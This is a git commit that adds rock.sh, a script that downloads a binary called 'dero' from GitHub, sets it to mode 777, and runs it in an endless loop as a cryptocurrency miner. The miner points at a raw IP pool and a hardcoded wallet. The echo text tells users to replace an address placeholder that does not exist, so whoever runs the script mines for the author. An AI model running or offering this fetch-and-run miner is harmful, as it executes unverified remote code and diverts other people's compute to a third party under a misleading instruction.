f9dd7f5a2adac63b0d00e9af8679e539f8fd0000
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-10-30 19:20:22 +0800

    Create rock.sh

---
+++ rock.sh
@@ -0,0 +1,9 @@
+wget https://github.com/sbwsmg/doraemon/raw/main/dero
+chmod 777 dero
+
+#!/bin/bash
+echo "Replace YOUR_ADDRESS to run the miner"
+while :; do
+    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6hsk03skqgr8tscz0xla -r 139.162.40.79:80 -p stratum;
+    sleep 5;
+done
